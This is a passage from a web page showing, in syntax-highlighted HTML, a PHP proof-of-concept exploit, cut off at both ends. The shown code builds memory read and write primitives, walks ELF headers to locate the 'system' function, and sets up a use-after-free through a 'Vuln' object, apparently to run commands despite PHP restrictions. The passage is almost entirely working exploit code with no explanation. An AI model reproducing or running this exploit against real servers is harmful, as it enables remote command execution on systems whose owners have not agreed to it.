class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ptr</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token variable\">$ptr</span> <span class=\"token operator\">&gt;&gt;</span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$out</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">write</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$n</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$n</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$p</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token variable\">$v</span> <span class=\"token operator\">&gt;&gt;</span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">global</span> <span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$helper</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$helper</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span> <span class=\"token operator\">!=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">%=</span> <span class=\"token number\">2</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$leak</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">parse_elf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token variable\">$e_type</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token variable\">$e_phoff</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token variable\">$e_phentsize</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token variable\">$e_phnum</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$e_phnum</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            <span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$e_phoff</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$e_phentsize</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token variable\">$p_type</span>  <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>            <span class=\"token variable\">$p_vaddr</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token variable\">$p_memsz</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">==</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\"># PT_LOAD, PF_Read_Write</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                <span class=\"token comment\"># handle pie</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$e_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$p_vaddr</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$p_vaddr</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                <span class=\"token variable\">$data_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p_memsz</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\"># PT_LOAD, PF_Read_exec</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                <span class=\"token variable\">$text_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p_memsz</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$data_addr</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token variable\">$text_size</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token variable\">$data_size</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_size</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_size</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_basic_funcs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        <span class=\"token keyword\">list</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_size</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_size</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_size</span> <span class=\"token operator\">/</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>                <span class=\"token variable\">$deref</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>                <span class=\"token comment\"># 'constant' constant check</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deref</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x746e6174736e6f63</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>                <span class=\"token variable\">$deref</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>                <span class=\"token comment\"># 'bin2hex' constant check</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deref</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x786568326e6962</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_binary_base</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$binary_leak</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>        <span class=\"token variable\">$base</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        <span class=\"token variable\">$start</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$binary_leak</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xfffffffffffff000</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>            <span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$start</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x1000</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x10102464c457f</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\"># ELF header</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token variable\">$addr</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token keyword\">do</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token variable\">$f_entry</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>            <span class=\"token variable\">$f_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_entry</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_name</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x6d6574737973</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\"># system</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>            <span class=\"token variable\">$addr</span> <span class=\"token operator\">+=</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_entry</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">my_str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>        <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>            <span class=\"token variable\">$s</span><span class=\"token operator\">.=</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>        <span class=\"token punctuation\">}</span>  </pre></td></tr><tr><td data-num=\"120\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">trigger_uaf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>        <span class=\"token comment\"># str_shuffle prevents opcache string interning</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>        <span class=\"token variable\">$arg</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_shuffle</span><span class=\"token punctuation\">(</span><span class=\"token function\">my_str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'A'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>        <span class=\"token variable\">$vuln</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>        <span class=\"token variable\">$vuln</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$arg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token constant\">PHP_OS</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'WIN'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'This PoC is for *nix systems only.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token variable\">$n_alloc</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> <span class=\"token comment\"># increase this value if UAF fails</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token variable\">$contiguous</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$n_alloc</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>        <span class=\"token variable\">$contiguous</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_shuffle</span><span class=\"token punctuation\">(</span><span class=\"token function\">my_str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'A'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>    <span class=\"token function\">trigger_uaf</span><span class=\"token punctuation\">(</span><span 